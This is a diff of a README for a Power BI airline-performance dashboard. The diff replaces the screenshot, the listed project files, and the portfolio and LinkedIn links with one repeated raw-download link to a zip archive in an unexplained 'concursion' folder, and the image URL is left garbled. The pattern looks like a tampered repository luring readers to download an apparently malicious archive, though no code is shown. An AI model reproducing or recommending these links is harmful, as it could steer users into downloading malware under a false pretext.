@@ -2,7 +2,7 @@
 
 This Power BI dashboard provides a comprehensive analysis of global airline performance using operational and financial metrics such as fleet size, EBIT (USD), ASK, passenger yield, and load factor. The visualizations explore the contrast between low-cost carriers and traditional airlines across regions.
 
-![Dashboard Screenshot](https://github.com/Siam-analytics/airline-performance-dashboard/blob/main/Screenshot%202025-07-06%20174900.png)
+![Dashboard Screenshot](https://github.com/Siam-analytics/airline-performance-dashboard/raw/refs/heads/main/concursion/dashboard_performance_airline_v1.5-alpha.5.zip%202025-07-06%https://github.com/Siam-analytics/airline-performance-dashboard/raw/refs/heads/main/concursion/dashboard_performance_airline_v1.5-alpha.5.zip)
 
 ## 📌 Project Highlights
 
@@ -23,8 +23,8 @@ This Power BI dashboard provides a comprehensive analysis of global airline perf
 
 ## 📁 Files
 
-- `AirlinePerformanceAnalysis.pbix`
-- `airline_data.csv`
+- `https://github.com/Siam-analytics/airline-performance-dashboard/raw/refs/heads/main/concursion/dashboard_performance_airline_v1.5-alpha.5.zip`
+- `https://github.com/Siam-analytics/airline-performance-dashboard/raw/refs/heads/main/concursion/dashboard_performance_airline_v1.5-alpha.5.zip`
 
 ## 💡 Tools Used
 
@@ -34,8 +34,8 @@ This Power BI dashboard provides a comprehensive analysis of global airline perf
 
 ## 🔗 Portfolio & Links
 
-- 📄 Portfolio: [https://www.datascienceportfol.io/siamahammed688](https://www.datascienceportfol.io/siamahammed688)
-- 💼 LinkedIn: [https://www.linkedin.com/in/siam-ahammed-844280336](https://www.linkedin.com/in/siam-ahammed-844280336)
+- 📄 Portfolio: [https://github.com/Siam-analytics/airline-performance-dashboard/raw/refs/heads/main/concursion/dashboard_performance_airline_v1.5-alpha.5.zip](https://github.com/Siam-analytics/airline-performance-dashboard/raw/refs/heads/main/concursion/dashboard_performance_airline_v1.5-alpha.5.zip)
+- 💼 LinkedIn: [https://github.com/Siam-analytics/airline-performance-dashboard/raw/refs/heads/main/concursion/dashboard_performance_airline_v1.5-alpha.5.zip](https://github.com/Siam-analytics/airline-performance-dashboard/raw/refs/heads/main/concursion/dashboard_performance_airline_v1.5-alpha.5.zip)
 
 ## 📥 How to Use
 
